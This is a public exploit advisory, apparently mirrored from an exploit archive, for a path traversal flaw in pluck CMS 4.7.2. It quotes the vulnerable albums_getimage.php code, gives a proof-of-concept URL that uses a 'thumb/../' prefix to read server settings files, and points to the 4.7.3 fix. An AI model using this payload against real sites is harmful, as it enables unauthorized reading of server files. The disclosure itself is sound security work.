@@ -1,0 +1,68 @@
+id: 23652
+date: 05/21/2015
+title: pluck CMS 4.7.2 Path Traversal Vulnerability
+author: Kacper Szurek
+cves: 
+
+# Exploit Title: pluck CMS 4.7.2 Path Traversal
+# Date: 21-05-2015
+# Software Link: http://www.pluck-cms.org/
+# Exploit Author: Kacper Szurek
+# Contact: http://twitter.com/KacperSzurek
+# Website: http://security.szurek.pl/
+# Category: webapps
+
+1. Description
+
+When we use word `thumb` at the begining of `$_GET['image']` it's possible to omit `preg_match()` function.
+
+File: data/modules/albums/albums_getimage.php
+
+$image = $_GET['image'];
+
+//Then, check for hacking attempts (Remote Code Execution), and block them.
+if (strpos($image, 'thumb') === false) {
+	if (preg_match('#([.*])([/])([A-Za-z0-9.]{0,11})#', $image, $matches)) {
+		if ($image != $matches[0]) {
+			unset($image);
+			die('A hacking attempt has been detected.');
+		}
+	}
+}
+
+elseif (strpos($image, 'thumb') !== false) {
+	if (preg_match('#([.*])([/])thumb([/])([A-Za-z0-9.]{0,11})#', $image, $matches)) {
+		if ($image != $matches[0]) {
+			unset($image);
+			die('A hacking attempt has been detected.');
+		}
+	}
+}
+
+//...if no hacking attempts found:
+//Check if file exists.
+if (file_exists('../../settings/modules/albums/'.$image)) {
+	//Generate the image, make sure it doesn't end up in the visitors buffer.
+	header('Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0');
+	header('Expires: Thu, 19 Nov 1981 08:52:00 GMT');
+	header('Pragma: no-cache');
+	header('Content-Type: image/jpeg');
+	echo readfile('../../settings/modules/albums/'.$image);
+}
+
+//If image doesn't exist, send 404 header.
+else
+	header('HTTP/1.0 404 Not Found');
+
+http://security.szurek.pl/pluck-cms-472-path-traversal.html
+
+2. Proof of Concept
+
+http://pluck-url/data/modules/albums/albums_getimage.php?image=thumb/../../../../settings/langpref.php
+  
+3. Solution:
+  
+Update to version 4.7.3
+https://github.com/pluck-cms/pluck/archive/4.7.3.zip
+
+#  0day.today [2023-03-26]  #
